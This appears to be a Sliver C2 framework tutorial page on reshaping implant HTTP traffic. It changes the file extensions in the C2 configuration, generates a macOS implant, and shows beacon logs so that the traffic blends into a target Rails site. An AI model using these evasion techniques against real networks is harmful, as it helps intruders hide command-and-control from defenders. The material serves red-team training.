# Advanced web traffic configuration

When generating implants sliver uses a subset of the configuration values defined in `~/.sliver/configs/http-c2.json` which can be arbitrarily modified. Keep in mind changing this configuration will break any previously created implants, so changes should happen before generating payloads.

The full list of possible configuration option can be found in the references section below, but for now lets instead customise the existing configuration.

Lets imagine we’re trying to breach a customer known for using ruby-on-rails. By default sliver will use:

- `.woff` for staging
- `.js` for poll requests
- `.html` for key exchanges
- `.png` for close session
- `.php` for session messages

Let’s go ahead and update the session messages and staging with something more realistic.

```bash
"session_file_ext": ".css",
"stager_file_ext": ".ico",
```

The next step is to restart the server and generate a new implant.

```bash
[server] sliver > generate -b localhost --skip-symbols --debug --os macos

[*] Generating new darwin/amd64 implant binary
[*] Build completed in 2s
[*] Implant saved to /Users/tester/ELECTRICAL_WOODSHED

[*] Session 73a2d969 ELECTRICAL_WOODSHED - [::1]:61672 (test.local) - darwin/amd64 - Tue, 25 Apr 2023 15:27:13 CEST
```

If you now look at the debug output you’ll notice we no longer have .php urls.

```bash
2023/04/25 15:27:41 httpclient.go:672: [http] segments = [oauth2 v1 authenticate auth], filename = index, ext = css
2023/04/25 15:27:41 httpclient.go:482: [http] POST -> http://localhost/oauth2/v1/authenticate/auth/index.css?p=711x58387 (2228 bytes)
2023/04/25 15:27:41 httpclient.go:488: [http] POST request completed
2023/04/25 15:27:42 httpclient.go:287: Cancelling poll context
2023/04/25 15:27:42 httpclient.go:672: [http] segments = [assets], filename = jquery, ext = js
2023/04/25 15:27:42 httpclient.go:406: [http] GET -> http://localhost/assets/jquery.js?r=72074674
2023/04/25 15:27:42 sliver.go:198: [recv] sysHandler 12
2023/04/25 15:27:42 session.go:189: [http] send envelope ...
2023/04/25 15:27:42 httpclient.go:672: [http] segments = [oauth v1 oauth2], filename = admin, ext = css
2023/04/25 15:27:42 httpclient.go:482: [http] POST -> http://localhost/oauth/v1/oauth2/admin.css?j=56685386 (93 bytes)
```

The next step would be to update the filenames and path used during generation to further blend into our target environment. One way to do that would be to use web enumeration lists such as the ones found here [https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content) to adapt your c2 traffic.

As an exercise try creating a profile for an environment using jsp’s.

## References

- [https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2](https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2)
- [https://github.com/BishopFox/sliver/wiki/C2-Advanced-Options](https://github.com/BishopFox/sliver/wiki/C2-Advanced-Options)
- [https://github.com/BishopFox/sliver/wiki/Configuration-Files](https://github.com/BishopFox/sliver/wiki/Configuration-Files)
